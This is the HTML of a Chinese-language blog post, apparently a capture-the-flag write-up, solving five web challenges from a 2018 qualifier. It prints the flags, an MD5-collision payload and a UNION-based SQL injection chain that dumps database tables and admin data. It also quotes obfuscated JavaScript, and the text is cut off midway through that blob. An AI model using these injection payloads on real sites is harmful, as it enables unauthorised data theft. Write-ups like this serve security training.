@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>2018WEB安全测试秋季预选赛 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1. Input 题目地址：http:&#x2F;&#x2F;114.55.36.69:8003&#x2F;进去后一个输入框，一个提交">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018WEB安全测试秋季预选赛">
+<meta property="og:url" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1. Input 题目地址：http:&#x2F;&#x2F;114.55.36.69:8003&#x2F;进去后一个输入框，一个提交">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/10.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/11.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/12.png">
+<meta property="og:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/13.png">
+<meta property="article:published_time" content="2018-10-28T13:31:43.000Z">
+<meta property="article:modified_time" content="2019-12-30T10:31:51.372Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-2018WEB安全测试秋季预选赛" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/" class="article-date">
+  <time datetime="2018-10-28T13:31:43.000Z" itemprop="datePublished">2018-10-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2018WEB安全测试秋季预选赛
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-Input"><a href="#1-Input" class="headerlink" title="1. Input"></a>1. Input</h3><blockquote>
+<p>题目地址：<a href="http://114.55.36.69:8003/" target="_blank" rel="noopener">http://114.55.36.69:8003/</a><br>进去后一个输入框，一个提交<br><a id="more"></a><br>但是这个按钮好像是无效的 点了也没有提交我们输入的内容</p>
+</blockquote>
+<p><img src="2018WEB安全测试秋季预选赛/1.png" alt=""><br>然后查看源代码，发现有一段JavaScript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function check()&#123;</span><br><span class="line">        var flag &#x3D; document.getElementById(&quot;flag&quot;).value;</span><br><span class="line">        var str &#x3D; &quot;d84d9657e5e5e&quot; || 0;</span><br><span class="line">        var str &#x3D; str + (&quot;ad2ad3fe&quot; &amp;&amp; 2);</span><br><span class="line">        var str &#x3D; str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;;</span><br><span class="line">        var str &#x3D; str.split(&quot;&quot;).reverse().join(&quot;&quot;);</span><br><span class="line">        if (str &#x3D;&#x3D; flag)&#123;</span><br><span class="line">            alert(&quot;恭喜你已经找到flag！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>然后就好说了，把<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str &#x3D; &quot;d84d9657e5e5e&quot; || 0;</span><br><span class="line">var str &#x3D; str + (&quot;ad2ad3fe&quot; &amp;&amp; 2);</span><br><span class="line">var str &#x3D; str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;;</span><br><span class="line">var str &#x3D; str.split(&quot;&quot;).reverse().join(&quot;&quot;);</span><br></pre></td></tr></table></figure><br>这4行代码粘贴到浏览器的控制台中，然后让浏览器弹出str的值就可以了<br><img src="2018WEB安全测试秋季预选赛/2.png" alt=""><br><img src="2018WEB安全测试秋季预选赛/3.png" alt=""><br>献上flag:    <code>4df4aedd8b4949ad2a2e5e5e7569d48d</code></p>
+<h3 id="2-简单的MD5"><a href="#2-简单的MD5" class="headerlink" title="2.简单的MD5"></a>2.简单的MD5</h3><blockquote>
+<p>题目地址：<a href="http://114.55.36.69:8004/" target="_blank" rel="noopener">http://114.55.36.69:8004/</a><br>进去后直接查看页面源代码：<code>easy MD5 cracking &lt;!--$_POST[&#39;data1&#39;]!=$_POST[&#39;data2&#39;]--&gt;fail</code><br>里面有这个东西</p>
+</blockquote>
+<p>分析之后发现，这个就是普通的PHP弱类型，用数组就行了<br><img src="2018WEB安全测试秋季预选赛/4.png" alt=""><br><code>flag{401cf19d304e557349fecda18110c138}</code></p>
+<h3 id="3-MD5"><a href="#3-MD5" class="headerlink" title="3. MD5"></a>3. MD5</h3><blockquote>
+<p>题目地址：<a href="http://114.55.36.69:8006/" target="_blank" rel="noopener">http://114.55.36.69:8006/</a><br>查看源代码有这句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((string)$_POST[&#39;data1&#39;]!&#x3D;&#x3D;(string)$_POST[&#39;data2&#39;]&amp;&amp;md5($_POST[&#39;data1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;data2&#39;]))</span><br></pre></td></tr></table></figure><br>这个用的是MD5碰撞<br>想学习的可以看这个博客：<a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/79088218</a><br>这里直接给出payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">data2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><br>提交时需要用urlencode一下<br><img src="2018WEB安全测试秋季预选赛/5.png" alt=""><br><code>flag{9bd1ee7355b58e53214adb9a37b4cb82}</code></p>
+</blockquote>
+<h3 id="4-新闻搜索"><a href="#4-新闻搜索" class="headerlink" title="4.新闻搜索"></a>4.新闻搜索</h3><blockquote>
+<p>题目地址：<a href="http://114.55.36.69:8010/" target="_blank" rel="noopener">http://114.55.36.69:8010/</a><br>刚开始没思路，后来看到源代码里面有一段JavaScript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function myFunction()</span><br><span class="line">	&#123;</span><br><span class="line">		var x&#x3D;document.getElementById(&quot;number&quot;).value;</span><br><span class="line">    var a&#x3D;document.getElementById(&quot;word&quot;).value;</span><br><span class="line">    var b&#x3D;a.replace(&#x2F;[\ |\~|\&#96;|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\&#x3D;|\||\\|\[|\]|\&#123;|\&#125;|\;|\:|\&quot;|\&#39;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\·|\！|\（|\）|\￥|\——|\……|\【|\】|\、|\；|\：|\‘|\“|\”|\’|\，|\。|\、|\《|\》|\？|\ ]&#x2F;g,&quot;&quot;);</span><br><span class="line">    if(a.length!&#x3D;b.length)</span><br><span class="line">    &#123;</span><br><span class="line">      alert(&quot;请输入正确字符。&quot;);</span><br><span class="line">      document.getElementById(&quot;number&quot;).value &#x3D; &#39;&#39;;</span><br><span class="line">      document.getElementById(&quot;word&quot;).value &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if(isNaN(x))</span><br><span class="line">    &#123;</span><br><span class="line">      alert(&quot;请输入数字。&quot;);</span><br><span class="line">      document.getElementById(&quot;number&quot;).value &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>许多字符被过滤掉了，猜测可能要用SQL注入，而它代码放到了前端，也就是说过滤只能从前端过滤，用hackbar注入它是检测不到的<br>直接给出payload:<br><img src="2018WEB安全测试秋季预选赛/6.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET:http:&#x2F;&#x2F;114.55.36.69:8010&#x2F;</span><br><span class="line">POST:</span><br><span class="line">	word&#x3D;-1&#39; union select 1,database(),2%23&amp;number&#x3D;5</span><br><span class="line">	word&#x3D;-1&#39; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;&#39;news&#39;%23&amp;number&#x3D;5</span><br><span class="line">	word&#x3D;-1&#39; union select 1,group_concat(column_name),2 from information_schema.columns where table_name&#x3D;&#39;admin&#39;%23&amp;number&#x3D;5</span><br><span class="line">	word&#x3D;-1&#39; union select 1,group_concat(flag),2 from admin%23&amp;number&#x3D;5</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<pre><code>flag{f98505d1d12f50a0bd9463e90876630}
+</code></pre><h3 id="5-Game"><a href="#5-Game" class="headerlink" title="5.Game"></a>5.Game</h3><blockquote>
+<p>题目地址：<a href="http://114.55.36.69:8011/" target="_blank" rel="noopener">http://114.55.36.69:8011/</a><br>emmmm  贪吃蛇挺好玩的</p>
+</blockquote>
+<p>查看源代码<br>  <img src="2018WEB安全测试秋季预选赛/7.png" alt=""><br>两个链接，随便点一点<br>在<code>game.js</code>中发现了点东西</p>
+<p><img src="2018WEB安全测试秋季预选赛/8.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ 